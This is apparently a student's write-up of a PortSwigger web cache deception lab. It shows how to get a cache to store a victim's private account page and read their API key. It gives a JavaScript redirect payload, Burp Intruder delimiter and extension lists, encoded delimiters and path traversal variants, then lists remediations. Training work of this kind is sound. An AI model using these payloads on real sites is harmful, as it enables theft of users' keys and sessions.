# Web Cache Deception
**Platform:** PortSwigger Web Security Academy  
**Difficulty:** Practitioner  
**Status:** ✅ Solved  
**Date:** May 2026  

---

## Objective

Exploit a Web Cache Deception vulnerability to steal 
the API key of the victim user (carlos).

**Credentials:**
Username : wiener
Password : peter
Target   : carlos

---

## What is Web Cache Deception ?

An attack that tricks a web server into caching 
private pages and making them publicly accessible.
Normal :
/my-account → private page (never cached) ✅
Attack :
/my-account/abc.js → server serves /my-account
→ cache sees .js → caches ! 😈

---

## Environment

| Tool     | Detail                           |
|----------|----------------------------------|
| OS       | Kali Linux                       |
| Proxy    | Burp Suite Community Edition     |
| Browser  | Chromium                         |
| Platform | PortSwigger Web Security Academy |

---

## PART 1 — Path Mapping Discrepancy

### Step 1 — Identify target endpoint

Logged in with wiener:peter.
Captured request in Burp → Proxy → HTTP History :
GET /my-account HTTP/2
Host: LAB-ID.web-security-academy.net
Cookie: session=xxxxx

Response contains API key → private data confirmed.

---

### Step 2 — Test path mapping

Sent to Repeater and tested :

**Test 1 :**
GET /my-account/abc HTTP/2
→ Identical response → server ignores /abc ✅

**Test 2 :**
GET /my-account/abc.js HTTP/2
→ X-Cache: miss
→ Cache-Control: max-age=30

**Test 3 (within 30 seconds) :**
GET /my-account/abc.js HTTP/2
→ X-Cache: hit ✅ Vulnerability confirmed !

---

### Step 3 — Craft exploit

```html
<script>
document.location="https://LAB-ID.web-security-academy.net/my-account/wcd.js"
</script>
```

### Step 4 — Deliver and steal

1. Pasted payload in exploit server Body
2. Clicked Deliver exploit to victim
3. Visited URL immediately :
https://LAB-ID.web-security-academy.net/my-account/wcd.js
4. Found carlos API key in cached response ! ✅

---

### Attack Flow
wiener finds /my-account/abc.js → X-Cache: hit
↓
Crafts exploit → delivers to carlos
↓
Carlos visits → cache stores HIS API key
↓
wiener visits same URL → steals API key ! 🎉

---

## PART 2 — Delimiter Discrepancy

### What is a delimiter ?

A character that tells the server "stop here" :
/my-account;abc.js
↑
delimiter (;)
Server → stops at ; → serves /my-account
Cache  → sees .js  → caches publicly ! 😈

### Testing methodology

**Step 1 — Base response**
GET /my-account HTTP/2
→ Note response length (reference)

**Step 2 — Add arbitrary string**
GET /my-account/aaa HTTP/2
→ Different response ? → continue ✅
→ Identical response ? → choose another endpoint

**Step 3 — Test each delimiter**
/my-account;aaa → identical to base ? → ; is delimiter ✅
/my-account,aaa → different ?         → , is NOT delimiter ❌

**Step 4 — Confirm cache behavior**
/my-account;aaa.js
→ X-Cache: miss → hit ✅ Vulnerability confirmed !

### Burp Intruder configuration

**Attack type : Cluster bomb**
URL : /my-account§§aaa.§js§

**Payload Set 1 — Delimiters :**
;  ,  !  @  #  $  %  &  '  (  )  *



.  /  :  <  =  >  ?  [  \  ]
^  `  {  |  }  ~




**Payload Set 2 — Extensions :**
js   css   jpg   png
ico  exe   pdf   txt
zip  woff  svg   xml

> ⚠️ Uncheck URL encode in Payload encoding !

**How to read results :**
Length = base response length → delimiter found ✅
Length different              → not a delimiter ❌

---

## PART 3 — Encoded Delimiter Discrepancy

### How it works
/my-account%23wcd.css
Server → decodes %23 to # → stops → serves /my-account
Cache  → doesn't decode   → sees .css → caches ! 😈

### Encoded characters list
%23 → #     %3F → ?     %26 → &
%3B → ;     %2C → ,     %40 → @
%21 → !     %24 → $     %2F → /
%3A → :     %3C → <     %3E → >
%3D → =     %2B → +     %60 → `
%7C → |     %5E → ^     %5B → [
%5D → ]     %7B → {     %7D → }
%7E → ~     %27 → '     %22 → "
%5C → \     %00 → NULL  %09 → TAB
%0A → newline

### Test in Repeater
GET /my-account%23aaa.css HTTP/2
GET /my-account%3Faaa.css HTTP/2
GET /my-account%26aaa.css HTTP/2

Look for :
X-Cache: hit + identical to base response → vulnerability ! ✅

---

## PART 4 — Static Directory Rules

### How it works

Cache automatically caches everything under static paths :
/assets/    /static/    /images/
/js/        /css/       /scripts/

### Directory traversal exploit
/assets/..%2fmy-account
Cache  → sees /assets/ → caches ! 😈
Server → decodes ..%2f to ../ → serves /my-account

### Paths to test
/assets/..%2fmy-account
/static/..%2fmy-account
/images/..%2fmy-account
/js/..%2fmy-account
/css/..%2fmy-account
/resources/..%2fmy-account

### Encoding variations
..%2f       →  ../  (standard)
..%2F       →  ../  (uppercase)
%2e%2e%2f  →  ../  (fully encoded)
%2e%2e/    →  ../  (dots encoded)
..%5c       →  ..\  (Windows)
%252f       →  /    (double encoded)

---

## PART 5 — Normalization Discrepancy

### What is normalization ?

When a server cleans and simplifies URLs :
/assets/..%2fmy-account → /my-account (normalized)

### The discrepancy
/static/..%2fmy-account
Cache  → doesn't normalize → sees /static/ → caches ! 😈
Server → normalizes        → serves /my-account (private !)

### How to detect

**Test origin server :**
GET /aaa/..%2fmy-account HTTP/2
Identical to /my-account ? → server normalizes ✅ exploitable !
Returns 404 ?              → server doesn't normalize ❌

**Test cache :**
Find cached resource :
/assets/js/app.js (X-Cache: hit)
Test :
/aaa/..%2fassets/js/app.js
Not cached anymore ? → cache doesn't normalize → exploitable !
Still cached ?       → cache normalizes

### Payload structure
/<static-directory>/..%2f<private-endpoint>
Example :
/assets/..%2fmy-account
Cache  → /assets/..%2fmy-account (static = cache it !)
Server → /my-account (private data returned !)

---

## Security Impact

| Impact                 | Severity |
|------------------------|----------|
| API key theft          | 🔴 High  |
| Session token theft    | 🔴 High  |
| Personal data exposure | 🔴 High  |
| Account takeover       | 🔴 Critical|

---

## Remediation

| Protection | Description |
|---|---|
| Cache-Control: no-store | Never cache private pages |
| Cache-Control: private | Cache only for specific user |
| Validate full URL | Don't ignore extra path segments |
| Cache authentication | Verify cookies before serving cache |
| CDN configuration | Configure cache rules carefully |

---

## Key Lessons Learned

- ✅ How CDN cache works
- ✅ X-Cache: miss vs hit
- ✅ Path mapping discrepancy
- ✅ Delimiter testing with Burp Intruder
- ✅ Encoded delimiter exploitation
- ✅ Directory traversal in cache context
- ✅ Normalization discrepancies
- ✅ JavaScript redirect with document.location
- ✅ Cache-Control: no-store importance
- ✅ RFC URI permissiveness

## References

- PortSwigger : portswigger.net/web-security/web-cache-deception
- OWASP : owasp.org
- RFC 3986 : tools.ietf.org/html/rfc3986

---
## Images 
- images/cache-deception-delimter

*Author : Gerard Lonzi*  
*Date : May 2026*  
*Platform : PortSwigger Web Security Academy*  
*Status : ✅ Solved*

